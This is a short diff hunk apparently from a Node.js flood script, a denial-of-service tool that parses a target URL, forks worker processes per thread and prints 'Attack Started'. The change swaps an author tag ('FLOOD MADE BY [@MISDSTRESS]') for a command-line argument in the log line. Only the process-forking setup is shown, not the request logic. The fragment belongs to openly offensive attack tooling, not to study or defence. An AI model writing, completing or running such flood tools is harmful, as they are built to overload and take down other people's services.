@@ -31,7 +31,7 @@ var parsed = url.parse(target);
 const payload = {};
 
 if (cluster.isMaster) {
-	console.log('Attack Started | FLOOD MADE BY [@MISDSTRESS]');
+	console.log(`Attack Started | ${process.argv[2]}`);
    for (let ads = 0; ads < threads; ads++) {
        cluster.fork();
    }
